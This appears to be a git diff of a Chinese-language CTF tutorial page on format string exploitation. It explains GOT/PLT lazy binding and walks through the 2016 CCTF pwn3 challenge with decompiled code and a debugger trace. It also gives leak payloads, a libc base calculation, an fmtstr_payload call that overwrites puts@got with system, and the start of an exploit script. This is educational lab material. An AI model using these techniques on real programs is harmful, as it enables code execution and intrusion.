+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="原理-1" class="heading-element"><span>原理</span>
+  <a href="#%e5%8e%9f%e7%90%86-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>目前的 ELF 编译系统使用一种成为延迟绑定( lazy binding )的技术来实现对共享库中函数的调用过程。该机制主要通过两个数据结构 GOT 和 过程链接表( Procedure Linkage Table , PLT )实现。其简化的原理为 : 当目标模块存在一个外部共享库的函数调用时，其在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p>
 <p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护时，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
 <p>假设我们需要将函数A的地址覆盖为函数B的地址，那么步骤如下：</p>
 <ol>
@@ -351,8 +368,11 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </ul>
 </li>
 </ol>
-<h4 id="例子-1" class="heading-element">
-  <a href="#%e4%be%8b%e5%ad%90-1" class="heading-mark"></a>例子</h4><p>使用的是2016 CCTF中的pwn3</p>
+<h4 id="例子-1" class="heading-element"><span>例子</span>
+  <a href="#%e4%be%8b%e5%ad%90-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>使用的是2016 CCTF中的pwn3</p>
 <p>首先查看保护</p>
 <pre tabindex="0"><code>hacker@ubuntu:~/Desktop/2016-CCTF-pwn3$ checksec pwn3
 [*] &#39;/home/hacker/Desktop/2016-CCTF-pwn3/pwn3&#39;
@@ -362,7 +382,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
     NX:       NX enabled
     PIE:      No PIE (0x8048000)</code></pre><p>开了NX。</p>
 <p>main()：</p>
-<div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-2Ch]
@@ -394,7 +414,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>ask_username():</p>
-<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">ask_username</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__cdecl</span> <span class="nf">ask_username</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-34h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
@@ -408,7 +428,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>对输入的每一位进行了+1的操作。</p>
 <p>ask_password()</p>
-<div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">ask_password</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">ask_password</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;sysbdmin&#34;</span><span class="p">)</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
@@ -418,7 +438,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;welcome!&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>操作之后的需要与sysbdmin相同。</p>
 <p>get_command()</p>
-<div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">get_command</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">get_command</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -431,7 +451,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">4</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>put_file()：</p>
-<div class="highlight" id="id-12"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_DWORD</span> <span class="o">*</span><span class="nf">put_file</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_DWORD</span> <span class="o">*</span><span class="nf">put_file</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// ST1C_4
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// eax
@@ -448,7 +468,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>malloc后调用两次get_input()函数，并在最后的 4 个字节内写入上一块调用 put_file 时获得的地址，然后更新头指针 file_head 并返回本次分配的空间的起始地址。</p>
 <p>也就是说，每次调用put_file()，分配244字节大小的空间，前40字节保存文件名，后200保存文件内容，最后四个字节保存上一块内存的地址，file_head是bss段上的变量，所以值为0，这样就在栈上得到一条链。</p>
 <p>get_input()</p>
-<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">get_input</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">get_input</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-10h]
@@ -479,7 +499,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>函数在遇到回车符号或达到最大输入量（第二个参数）前，会一直向第一个参数指定的缓冲区中写入输入的内容.</p>
 <p>show_dir()：函数遍历前面利用 put_file 得到的链栈，并依次将它们的名字复制到大小为 1024 个字节的缓冲区中，然后输出缓冲区的内容</p>
-<div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show_dir</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show_dir</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-414h]
@@ -500,7 +520,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>get_file()：存在漏洞的函数。</p>
-<div class="highlight" id="id-15"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-FCh]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+E4h] [ebp-34h]
@@ -529,13 +549,13 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 <p>第二步比较简单，主要是第一步。</p>
 <p>不知道system函数的地址，因为我们不知道动态链接后libc的基址，这首先需要将这个信息泄露</p>
 <p>我们先在printf的地址下断点</p>
-<div class="highlight" id="id-16"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048895</span> <span class="nl">loc_8048895:</span>                            <span class="c1">; CODE XREF: get_file+8B↑j
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048895</span> <span class="nl">loc_8048895:</span>                            <span class="c1">; CODE XREF: get_file+8B↑j
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">08048895</span>                 <span class="nf">lea</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">dest</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804889</span><span class="nf">B</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">eax</span>      <span class="c1">; format
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">0804889</span><span class="nf">E</span>                 <span class="no">call</span>    <span class="no">_printf</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A3</span>                 <span class="no">leave</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A4</span>                 <span class="no">retn</span>
-</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A4</span> <span class="no">get_file</span>        <span class="no">endp</span></span></span></code></pre></div><div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080488</span><span class="nf">A4</span> <span class="no">get_file</span>        <span class="no">endp</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">r</span>
 </span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yutao</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="mi">2016</span><span class="o">-</span><span class="n">CCTF</span><span class="o">-</span><span class="n">pwn3</span><span class="o">/</span><span class="n">pwn3</span> 
 </span></span><span class="line"><span class="cl"><span class="n">Connected</span> <span class="n">to</span> <span class="n">ftp</span><span class="p">.</span><span class="n">hacker</span><span class="p">.</span><span class="n">server</span>
 </span></span><span class="line"><span class="cl"><span class="mi">220</span> <span class="n">Serv</span><span class="o">-</span><span class="n">U</span> <span class="n">FTP</span> <span class="n">Server</span> <span class="n">v6</span><span class="mf">.4</span> <span class="k">for</span> <span class="n">WinSock</span> <span class="n">ready</span><span class="p">...</span>
@@ -616,15 +636,15 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 </span></span><span class="line"><span class="cl"><span class="mi">16</span><span class="o">:</span><span class="mo">005</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcf18</span> <span class="err">—▸</span> <span class="mh">0xf7fb4220</span> <span class="p">(</span><span class="n">_IO_helper_jumps</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
 </span></span><span class="line"><span class="cl"><span class="mi">17</span><span class="o">:</span><span class="mo">005</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffcf1c</span> <span class="err">—▸</span> <span class="mh">0xf7fb49f4</span> <span class="err">◂—</span> <span class="mh">0x0</span>
 </span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span></span></span></code></pre></div><p>可以看出字符串偏移为7，接下来得到puts@got地址：</p>
-<div class="highlight" id="id-18"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="ow">or</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span></span></span></code></pre></div><p>接下来接收puts函数的真实地址：</p>
-<div class="highlight" id="id-19"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span></span></span></code></pre></div><p>由于我们使用的是本地的libc，所以挂载本地的libc就行了。查看一下程序在运行时使用的libc文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span></span></span></code></pre></div><p>由于我们使用的是本地的libc，所以挂载本地的libc就行了。查看一下程序在运行时使用的libc文件：</p>
 <pre tabindex="0"><code class="language-linux" data-lang="linux">yutao@pwnbaby:~/ctf-challenges/pwn/fmtstr/2016-CCTF-pwn3$ ldd pwn3
 	linux-gate.so.1 (0xf7f10000)
 	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d19000)
 	/lib/ld-linux.so.2 (0xf7f11000)</code></pre><p>从上图可以看到真正用到的是”/lib/i386-linux-gnu/libc.so.6“这个库，所以把这个库载入进来就可以了：‘</p>
-<div class="highlight" id="id-21"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span></span></span></code></pre></div><p>接下来就是覆盖puts函数了，首先介绍下pwntools中的fmtstr_payload函数</p>
 <pre tabindex="0"><code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)
@@ -633,8 +653,8 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre>
 第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
 第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
 fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payload这样写：</p>
-<div class="highlight" id="id-23"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">sys_addr</span><span class="p">})</span></span></span></code></pre></div><p><strong>EXP：</strong></p>
-<div class="highlight" id="id-24"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## -*- coding: UTF-8 -*-</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">sys_addr</span><span class="p">})</span></span></span></code></pre></div><p><strong>EXP：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## -*- coding: UTF-8 -*-</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl">
@@ -688,27 +708,36 @@ fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payl
 <li>修改 puts@got 的内容为 system 的地址。</li>
 <li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
 </ol>
-<h3 id="hijack-retaddr" class="heading-element">
-  <a href="#hijack-retaddr" class="heading-mark"></a>hijack retaddr</h3><h4 id="原理-2" class="heading-element">
-  <a href="#%e5%8e%9f%e7%90%86-2" class="heading-mark"></a>原理</h4><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
-<h4 id="例子-2" class="heading-element">
-  <a href="#%e4%be%8b%e5%ad%90-2" class="heading-mark"></a>例子</h4><p>这里用的是<strong>三个白帽-pwnme_k0</strong>为例
+<h3 id="hijack-retaddr" class="heading-element"><span>hijack retaddr</span>
+  <a href="#hijack-retaddr" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="原理-2" class="heading-element"><span>原理</span>
+  <a href="#%e5%8e%9f%e7%90%86-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
+<h4 id="例子-2" class="heading-element"><span>例子</span>
+  <a href="#%e4%be%8b%e5%ad%90-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>这里用的是<strong>三个白帽-pwnme_k0</strong>为例
